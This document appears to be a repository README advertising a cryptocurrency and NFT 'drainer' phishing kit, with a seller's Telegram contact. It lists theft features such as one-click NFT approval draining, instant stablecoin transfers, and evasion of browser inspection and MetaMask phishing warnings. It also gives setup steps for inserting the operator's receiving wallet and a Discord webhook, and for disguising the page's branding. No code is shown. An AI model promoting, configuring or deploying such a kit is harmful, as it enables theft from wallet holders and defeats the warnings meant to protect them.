# ***⛔ This Repo Has No Backdoors!***
### If you need any help, DM me here: https://t.me/RexXO0

## 🖼️ ETH Stealer / NFT Stealer / USDT Stealer / Drainer Template / ETH Drainer / NFT Drainer / USDT Drainer

![preview](https://media.discordapp.net/attachments/988355855286145107/998526395741372507/03569959dafc6e73803a82231a4e2539.png?width=1174&height=572)

## `💡 Features`
- [x] Inspect Element Detection
- [x] Custom Design
- [x] Cool design 
- [x] Instant ETH/USDT/USDC/BUSD/DAI transactions
- [x] Set Aproval NFT method
- [x] Steals all NFT's with one click
- [x] No contract required
- [x] Anti Metamask Phishing Detections
- [x] Anti F12 Inspect
- [x] NO BACKDOOR


## `✏️ Setup Guide:` 

1. Edit the **settings.js** file. 

DONT FORGET TO PUT YOUR WALLET ADRESS IN SETTINGS.js LINE 3 - it won'w work without it!
- line 3: const receiveAddress = `"PutYourAddressHere";` replace **PutYourAddressHere with your ETH wallet address.**
- line 36: put your Discord Webhook there

2. Design Change:

Index.html:

- line 6: Title of The Project
- line 33: Discord Embed Preview Picture Link in there          content="YOUR Picture Link"
- line 35: Favicon                                              href="favicon link"
- line 135: Twitter Link                                        href="Twitter link"




To get instant support, contact me on Telegram (https://t.me/RexXO0)


## `⭐ Socials :`

- Telegram: https://t.me/RexXO0

##### Please ⭐ the repo to support our project
